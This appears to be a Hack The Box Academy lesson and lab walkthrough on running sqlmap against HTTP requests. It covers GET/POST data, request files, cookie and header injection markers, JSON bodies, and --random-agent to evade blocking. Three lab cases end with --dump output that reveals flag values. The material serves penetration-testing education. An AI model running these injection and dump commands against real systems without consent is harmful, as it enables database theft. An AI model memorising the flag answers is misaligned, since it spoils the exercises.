# 

---

SQLMap has numerous options and switches that can be used to properly set up the (HTTP) request before its usage.

In many cases, simple mistakes such as forgetting to provide proper cookie values, over-complicating setup with a lengthy command line, or improper declaration of formatted POST data, will prevent the correct detection and exploitation of the potential SQLi vulnerability.

---

## Curl Commands

One of the best and easiest ways to properly set up an SQLMap request against the specific target (i.e., web request with parameters inside) is by utilizing `Copy as cURL` feature from within the Network (Monitor) panel inside the Chrome, Edge, or Firefox Developer Tools: ![Network panel showing a GET request to www.example.com with a 404 status, and a context menu with options like 'Copy as cURL'.](https://academy.hackthebox.com/storage/modules/58/M5UVR6n.png)

By pasting the clipboard content (`Ctrl-V`) into the command line, and changing the original command `curl` to `sqlmap`, we are able to use SQLMap with the identical `curl` command:

  Running SQLMap on an HTTP Request

```shell-session
xF1NN@htb[/htb]$ sqlmap 'http://www.example.com/?id=1' -H 'User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0' -H 'Accept: image/webp,*/*' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'DNT: 1'
```

When providing data for testing to SQLMap, there has to be either a parameter value that could be assessed for SQLi vulnerability or specialized options/switches for automatic parameter finding (e.g. `--crawl`, `--forms` or `-g`).

---

## GET/POST Requests

In the most common scenario, `GET` parameters are provided with the usage of option `-u`/`--url`, as in the previous example. As for testing `POST` data, the `--data` flag can be used, as follows:

  Running SQLMap on an HTTP Request

```shell-session
xF1NN@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

In such cases, `POST` parameters `uid` and `name` will be tested for SQLi vulnerability. For example, if we have a clear indication that the parameter `uid` is prone to an SQLi vulnerability, we could narrow down the tests to only this parameter using `-p uid`. Otherwise, we could mark it inside the provided data with the usage of special marker `*` as follows:

  Running SQLMap on an HTTP Request

```shell-session
xF1NN@htb[/htb]$ sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

---

## Full HTTP Requests

If we need to specify a complex HTTP request with lots of different header values and an elongated POST body, we can use the `-r` flag. With this option, SQLMap is provided with the "request file," containing the whole HTTP request inside a single textual file. In a common scenario, such HTTP request can be captured from within a specialized proxy application (e.g. `Burp`) and written into the request file, as follows:

![HTTP GET request to www.example.com with headers including User-Agent and Accept-Language.](https://academy.hackthebox.com/storage/modules/58/x7ND6VQ.png)

An example of an HTTP request captured with `Burp` would look like:

Code: http

```http
GET /?id=1 HTTP/1.1
Host: www.example.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
DNT: 1
If-Modified-Since: Thu, 17 Oct 2019 07:18:26 GMT
If-None-Match: "3147526947"
Cache-Control: max-age=0
```

We can either manually copy the HTTP request from within `Burp` and write it to a file, or we can right-click the request within `Burp` and choose `Copy to file`. Another way of capturing the full HTTP request would be through using the browser, as mentioned earlier in the section, and choosing the option `Copy` > `Copy Request Headers`, and then pasting the request into a file.

To run SQLMap with an HTTP request file, we use the `-r` flag, as follows:

Running SQLMap on an HTTP Request

```shell-session
xF1NN@htb[/htb]$ sqlmap -r req.txt
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.4.9}
|_ -| . [(]     | .'| . |
|___|_  [.]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 14:32:59 /2020-09-11/

[14:32:59] [INFO] parsing HTTP request from 'req.txt'
[14:32:59] [INFO] testing connection to the target URL
[14:32:59] [INFO] testing if the target URL content is stable
[14:33:00] [INFO] target URL content is stable
```

Tip: similarly to the case with the '--data' option, within the saved request file, we can specify the parameter we want to inject in with an asterisk (*), such as '/?id=*'.

---

## Custom SQLMap Requests

If we wanted to craft complicated requests manually, there are numerous switches and options to fine-tune SQLMap.

For example, if there is a requirement to specify the (session) cookie value to `PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c` option `--cookie` would be used as follows:

  Running SQLMap on an HTTP Request

```shell-session
xF1NN@htb[/htb]$ sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

The same effect can be done with the usage of option `-H/--header`:

  Running SQLMap on an HTTP Request

```shell-session
xF1NN@htb[/htb]$ sqlmap ... -H='Cookie:PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

We can apply the same to options like `--host`, `--referer`, and `-A/--user-agent`, which are used to specify the same HTTP headers' values.

Furthermore, there is a switch `--random-agent` designed to randomly select a `User-agent` header value from the included database of regular browser values. This is an important switch to remember, as more and more protection solutions automatically drop all HTTP traffic containing the recognizable default SQLMap's User-agent value (e.g. `User-agent: sqlmap/1.4.9.12#dev (http://sqlmap.org)`). Alternatively, the `--mobile` switch can be used to imitate the smartphone by using that same header value.

While SQLMap, by default, targets only the HTTP parameters, it is possible to test the headers for the SQLi vulnerability. The easiest way is to specify the "custom" injection mark after the header's value (e.g. `--cookie="id=1*"`). The same principle applies to any other part of the request.

Also, if we wanted to specify an alternative HTTP method, other than `GET` and `POST` (e.g., `PUT`), we can utilize the option `--method`, as follows:

Running SQLMap on an HTTP Request

```shell-session
xF1NN@htb[/htb]$ sqlmap -u www.target.com --data='id=1' --method PUT
```

---

## Custom HTTP Requests

Apart from the most common form-data `POST` body style (e.g. `id=1`), SQLMap also supports JSON formatted (e.g. `{"id":1}`) and XML formatted (e.g. `<element><id>1</id></element>`) HTTP requests.

Support for these formats is implemented in a "relaxed" manner; thus, there are no strict constraints on how the parameter values are stored inside. In case the `POST` body is relatively simple and short, the option `--data` will suffice.

However, in the case of a complex or long POST body, we can once again use the `-r` option:

  Running SQLMap on an HTTP Request

```shell-session
xF1NN@htb[/htb]$ cat req.txt
HTTP / HTTP/1.0
Host: www.example.com

{
  "data": [{
    "type": "articles",
    "id": "1",
    "attributes": {
      "title": "Example JSON",
      "body": "Just an example",
      "created": "2020-05-22T14:56:29.000Z",
      "updated": "2020-05-22T14:56:28.000Z"
    },
    "relationships": {
      "author": {
        "data": {"id": "42", "type": "user"}
      }
    }
  }]
}
```

  Running SQLMap on an HTTP Request

```shell-session
xF1NN@htb[/htb]$ sqlmap -r req.txt
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.4.9}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org


[*] starting @ 00:03:44 /2020-09-15/

[00:03:44] [INFO] parsing HTTP request from 'req.txt'
JSON data found in HTTP body. Do you want to process it? [Y/n/q] 
[00:03:45] [INFO] testing connection to the target URL
[00:03:45] [INFO] testing if the target URL content is stable
[00:03:46] [INFO] testing if HTTP parameter 'JSON type' is dynamic
[00:03:46] [WARNING] HTTP parameter 'JSON type' does not appear to be dynamic
[00:03:46] [WARNING] heuristic (basic) test shows that HTTP parameter 'JSON type' might not be injectable
```

---
## Question 1

### "What's the contents of table flag2? (Case #2)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #2":

![SQLMap_Essentials_image_2.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_2.png)

Students will notice that they need to exploit the SQLi in the `id` `POST` parameter:

![SQLMap_Essentials_image_3.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_3.png)

Thus, the `sqlmap` command will be as follows:

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case2.php' --data 'id=1' --batch --dump
```

  Running SQLMap on an HTTP Request

```shell-session
┌─[us-academy-1]─[10.10.14.25]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u "http://188.166.168.88:31227/case2.php" --data 'id=1' --batch --dump

        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.5.9#stable}
|_ -| . [.]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

<SNIP>

Database: testdb
Table: flag2
[1 entry]
+----+----------------------------------------+
| id | content                                |
+----+----------------------------------------+
| 1  | HTB{700_much_c0n6r475_0n_p057_r3qu357} |
+----+----------------------------------------+

[19:27:11] [INFO] table 'testdb.flag2' dumped to CSV file '/home/htb-ac413848/.local/share/sqlmap/output/188.166.168.88/dump/testdb/flag2.csv'
[19:27:11] [INFO] fetched data logged to text files under '/home/htb-ac413848/.local/share/sqlmap/output/188.166.168.88'
[19:27:11] [WARNING] your sqlmap version is outdated

[*] ending @ 19:27:11 /2022-07-14/
```

Answer: {hidden}

# Running SQLMap on an HTTP Request

## Question 2

### "What's the contents of table flag3? (Case #3)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #3" to notice that they need to exploit the vulnerable cookie header `id`:

![SQLMap_Essentials_image_4.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_4.png)

Thus, the `sqlmap` command will be as follows:

Code: shell

```shell
sqlmap -u 'http://STMIP:STMPO/case3.php' -H 'Cookie: id=*' --batch --dump
```

  Running SQLMap on an HTTP Request

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -u 'http://206.189.24.232:30991/case3.php' -H 'Cookie: id=*' --batch --dump

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.8#stable}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[*] starting @ 17:23:43 /2022-09-29/

<SNIP>

custom injection marker ('*') found in option '--headers/--user-agent/--referer/--cookie'. Do you want to process it? [Y/n/q] Y
[17:23:43] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid

[17:23:46] [INFO] (custom) HEADER parameter 'Cookie #1*' is 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' injectable

<SNIP>

[17:25:14] [INFO] fetching columns for table 'flag3' in database 'testdb'
[17:25:14] [INFO] retrieved: 'id','int(11)'
[17:25:14] [INFO] retrieved: 'content','varchar(512)'
[17:25:14] [INFO] fetching entries for table 'flag3' in database 'testdb'                       
Database: testdb
Table: flag3
[1 entry]
+----+------------------------------------------+
| id | content                                  |
+----+------------------------------------------+
| 1  | HTB{c00k13_m0n573r_15_7h1nk1n6_0f_6r475} |
+----+------------------------------------------+

<SNIP>
```

Answer: {hidden}

# Running SQLMap on an HTTP Request

## Question 3

### "What's the contents of table flag4? (Case #4)"

Students first need to navigate to the website's root page of the spawned target and then click on "Case #4" to notice that they need to exploit the JSON value `id`:

![SQLMap_Essentials_image_5.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_5.png)

Here, students need to intercept the request being sent so that they can use it with `sqlmap`; to intercept the request, students can either use an intercepting proxy (such as `BurpSuite`) or, the Web Developer Tools of the browser. To do so with the latter, students first need to open the Network Tab (`Ctrl` + `Shift` + `E` for Windows or `Cmd` + `Opt` + `E` for Mac) then refresh the page to notice the `POST` request to "case4.php". Students need to click on it, then, on the right side scroll down until "Request Headers" and switch to "Raw" to copy the request headers (and save them into a file):

![SQLMap_Essentials_image_6.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_6.png)

Then, students need to click on "Request", switch on "Raw", and copy the data so that it can be appended after the request headers:

![SQLMap_Essentials_image_7.png](https://academy.hackthebox.com/storage/walkthroughs/55/SQLMap_Essentials_image_7.png)

The final request will look like the following:

  Running SQLMap on an HTTP Request

```shell-session
POST /case4.php HTTP/1.1
Host: 206.189.24.232:30991
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json
Content-Length: 8
Origin: http://206.189.24.232:30991
DNT: 1
Connection: keep-alive
Referer: http://206.189.24.232:30991/case4.php
Sec-GPC: 1

{"id":1}
```

Now that the request is saved in a file, students need to provide it to `sqlmap`:

Code: shell

```shell
sqlmap -r req.txt --batch --dump
```

  Running SQLMap on an HTTP Request

```shell-session
┌─[us-academy-1]─[10.10.15.8]─[htb-ac413848@pwnbox-base]─[~]
└──╼ [★]$ sqlmap -r request.txt --batch --dump

        ___
       __H__
 ___ ___[']_____ ___ ___  {1.6.8#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:07:45 /2022-09-29/

<SNIP>

Database: testdb
Table: flag4
[1 entry]
+----+---------------------------------+
| id | content                         |
+----+---------------------------------+
| 1  | HTB{j450n_v00rh335_53nd5_6r475} |
+----+---------------------------------+

<SNIP>
```

Answer: {hidden}